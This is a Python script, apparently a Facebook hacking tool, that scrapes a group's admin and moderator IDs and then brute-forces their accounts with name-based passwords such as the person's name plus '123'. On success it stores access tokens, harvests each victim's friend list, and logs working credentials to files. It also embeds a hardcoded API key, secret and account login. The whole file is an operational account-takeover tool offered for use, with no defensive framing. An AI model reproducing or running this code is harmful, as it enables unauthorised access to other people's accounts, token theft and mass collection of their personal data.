import requests
from bs4 import BeautifulSoup
from http.cookiejar import LWPCookieJar as kuki
import sys
import mechanize
import os
import threading
import hashlib
import json

if sys.platform in ["linux","linux2"]:
	G = "\033[32m"
	R = "\033[31m"
	Y = "\033[33m"
	BB = "\033[1m"
	B = "\033[0m"
	U = "\033[35m"
	cl = "clear"
	rm = "rm -rf cookies.txt"
	make = "touch cookies.txt"

else:
	G = " "
	R = " "
	Y = " "
	BB = " "
	U = " "
	B = " "
	cl = "cls"
	rm = "del cookies.txt"
	make = "copy nul cookies.txt"
	
	
logo = f"""{R}            
                         .'\   /`.            
                       .'.-.`-'.-.`.
                  ..._:   .-. .-.   :_...   
                .'    '-.({G}o{R} ) ({G}o{R} ).-'    `. 
              {R} :  _    _ _`~(_)~`_ _    _  :
              :  /:   ' .-=_   _=-. `   ;\  :
              :   :|-.._  '     `  _..-|:   : 
               :   `:| |`:-:-.-:-:'| |:'   : 
                `.   `.| | | | | | |.'   .' 
                  `.   `-:_| | |_:-'   .'
                    `-._   ````    _.-'
                        ``-------''{G}
                  [ Created By : Hagir$ ]
              {U} Crack Admin & Moderator Group {B}                   
                               
"""
s = requests.Session()
member = []
a_pwd = []
c_pwd = []

def recv(id, pwd):
	i = 0
	for x in id:
		pwds = pwd[i].split(' ')[0] +"123" if pwd in a_pwd else pwd[i]
		print(f"Cracking User {x} -> {pwds}")
		brute_mbrute(str(x),pwds)
		i += 1
	input(f"{G}[ DONE ]{B}")
	os.system("clear")
	menu(logo)
	
def brute_mbrute(id, pwd):
		API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
		data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
		sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
		
		x = hashlib.md5()
		x.update(sig.encode())
		data.update({'sig':x.hexdigest()})
		
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)
		if "access_token" in a:
			token = a['access_token']
			f = open("token.log","w")
			f.write(token)
			f.close()
		
			s = requests.get('https://graph.facebook.com/me?access_token='+token).json()
			name = s['name']
		
			r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=' + token)
			result = json.loads(r.text)
		
	
			for x in result['friends']['data']:
				y = x['id'] + "\n"
				f = open("data/friend/"+name+".txt","a")
				f.write(y)
				f.close()
		
			text = str(id) +"|"+pwd +"\n"
			g = open("live.txt","a")
			g.write(text)
			g.close()
		
			print(BB +str(id) +" | "+pwd+ G + " [ LIVE ]" + B)
			
		if 'www.facebook.com' in a['error_msg']:
			text = str(id) +"|"+pwd +"\n"
			h = open("checkpoin.txt","a")
			h.write(text)
			h.close()
			print(BB +str(id) +" | "+pwd+ Y + " [ CP ]" + B)
		
		else:
			print("\033[31m[ ! ] Username And Password Incorrect\033[0m")





def show():	
	f = open("id.txt","a")
	count = len(member)
	print(f"{BB}Name Group : { title }{B}")
	print("-"*50)
	
	
	for x in member:
		url = "https://mbasic.facebook.com/" + str(x)
		uri = s.get(url).text
		soup = BeautifulSoup(uri, "html.parser")
		usern = soup.title.string.split("|")[0]
		print(str(x) +f"  ->  {BB}"+ str(usern) +f"{B}")
		a_pwd.append(usern)
		x = x + "\n"
		f.write(x)
		
		
	print("-"*50)
	print(f"Count : {count}")
	input("[ CRACK ]")
	opt = input(f"{G}Would you like to use your own password list?[ y / n ]{B}")
	if opt == "y":
		i = 0
		while 1:
			print(f"Input Password For Username  {a_pwd[i]}")
			c = input("[ ? ] Password : ")
			c_pwd.append(c)
			if i == len(member) - 1:
				input("[ CRACK! ]")
				os.system("rm -rf cookies.txt")
				print(f"{G}[ * ] Brute Force Running{B}")
				t1 = threading.Thread(target=recv,args=(member,c_pwd))
				t1.start()
				t1.join()
			else:
				i += 1
				
	else:
		os.system("rm -rf cookies.txt")
		print("{G}[ * ] Brute Force Running{B}")
		t1 = threading.Thread(target=recv,args=(member,a_pwd))
		t1.start()
		t1.join()
		input("[ ]")
		
		
		
				
	os.system("clear")
	menu(logo)
	
		
def get_id(param):
	try:
		url = "https://mbasic.facebook.com/" + param[0]
		data = []
		uri = s.get(url).text
		soup = BeautifulSoup(uri, "html.parser")
		for x in soup.find_all("table"):
			data.append(x.get('id'))

		for x in range(len(data)):
			if "member" in str(data[x]):
				member.append(data[x].split("_")[1])
		show()
	except:
		show()
	
	
		
    

def process_3(param):
	print(f"{G}{BB}[ * ] Success : Retrieve Admod ID{B}")
                            
	url = "https://mbasic.facebook.com/" + param[0]
	uri = s.get(url).text
	data = []
	param = []
	data2 = []
	soup = BeautifulSoup(uri, "html.parser")
	for x in soup.find_all("table"):
		data.append(x.get('id'))

	for x in range(len(data)):
		if "member" in str(data[x]):
			member.append(data[x].split("_")[1])
			
	for x in soup.find_all("a"):
		data2.append(x.get('href'))
	
	for x in range(len(data2)):
		if "/browse/" in str(data2[x]):
			param.append(data2[x])
	
	get_id(param)
	
def process_2(param):
	print(f"{G}[ * ] Processing : View List Admin And Moderator{B}")
	url = "https://mbasic.facebook.com/"+param[0]
	data = []
	param = []
	uri = s.get(url).text
	soup = BeautifulSoup(uri,"html.parser")
	for x in soup.find_all("a"):
		data.append(x.get('href'))
	
	for x in range(len(data)):
		if "list_admin_moderator" in str(data[x]):
			param.append(data[x])
			
	process_3(param)
		
		

def process_1(user,target):
	global title
	print(f"{G}[ * ] Processing : View Member Data{B}")
	url = 'https://mbasic.facebook.com/groups/'+target +"/"

	s.cookies = kuki('cookies.txt')
	s.cookies.load()
	uri = s.get(url).text
	data = []
	param = []
	soup = BeautifulSoup(uri, "html.parser")
	title = soup.title.string.split("|")[0]
	for x in soup.find_all("a"):
		data.append(x.get('href'))
		
	for x in range(len(data)):
		if "?view=members" in str(data[x]):
			param.append(data[x])
	process_2(param)
			



def login(user,pwd,target):
	print(f"{G}[ * ] Logging in {B}")
	cj = kuki('cookies.txt')
	try:
		data = []
		br = mechanize.Browser()
		br.set_cookiejar(cj)
		br.set_handle_gzip(True)
		br.set_handle_redirect(True) 
		br.set_handle_robots(False)
		br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
		br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/12.0.1987/37.7327; U; pl) Presto/2.12.423 Version/12.16')]
		br.open('https://mbasic.facebook.com/login')
		br._factory.is_html = True
		br.select_form(nr = 0)
		br.form['email'] = user
		br.form['pass'] = pwd     
		sub = br.submit().read()
		if "doesn't match" in str(sub):
			print("\033[31m[ x ] Username Or Password Wrong\033[0m")
			os.system(rm)
		if "checkpoint" in str(sub):
			print(R + "[ x ] Account Checkpoint" + B)
			os.system(rm)
		else:
			os.system(make)
			cj.save()
			process_1(user,target)
	
	except:
		print(f"{R} [ ! ] Failed{B}")
		os.system("clear")
		menu(logo)


def menu(banner=None):
	print(banner)
	target = str(input("[?] ID Group : "))
	if len(target) < 1:
		os.system("clear")
		print(f"{R} Empty -_- {B}")
		print(f"{BB} Type {G}Exit{B} to exit the program{B}")
		menu(logo)
	if target == "exit":
		os.system("clear")
		print(f"{R} Thanks You :) {B}")
		exit()
	note = str(input("Use a server account? (y/n)"))
	
	if note == "y":
		login("92349545712483","512483",target)
	if note == "n":
		print(f"{BB}[ * ] Login Facebook{B}")
		usr = input(f"{U}[ ? ]{BB} Username : ")
		pwd = input(f"{U}[ ? ]{BB} Password : ")
		login(usr,pwd,target)
	else:
		os.system("clear")
		print(f"{R} Command Not Found{B}")
		menu(logo)

menu(logo)
	
		
	

	
